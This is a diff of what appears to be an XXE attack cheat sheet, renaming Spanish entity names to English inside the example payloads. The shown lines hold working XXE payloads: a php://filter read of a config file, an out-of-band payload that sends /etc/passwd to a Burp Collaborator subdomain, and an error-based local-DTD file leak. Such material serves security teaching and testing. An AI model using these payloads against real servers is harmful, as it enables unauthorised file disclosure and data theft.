@@ -164,8 +164,8 @@ Example:
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE foo [
-<!ENTITY cargar SYSTEM "php://filter/read=convert.base64-encode/resource=http://vulnerable-web.com/config.php">]>
-<foo><result>&cargar;</result></foo>
+<!ENTITY load SYSTEM "php://filter/read=convert.base64-encode/resource=http://vulnerable-web.com/config.php">]>
+<foo><result>&load;</result></foo>
 ```
 
 ---
@@ -192,7 +192,7 @@ Example:
 
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://subdominio.burpcollaborator.net/?x=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://subdomain.burpcollaborator.net/?x=%file;'>">
 %eval;
 %exfiltrate; 
 ```
@@ -229,9 +229,9 @@ Example:
 <!ENTITY % ISOamso '
   <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
   <!ENTITY &#x25; variable "
-      <!ENTITY &#x26;#x25; errormensaje SYSTEM &#x27;file:///notexist/&#x25;file;&#x27;>
+      <!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///notexist/&#x25;file;&#x27;>
   ">
   &#x25;variable;
-  &#x25;errormensaje;
+  &#x25;error;
 '>%el_dtd;]>
 ```
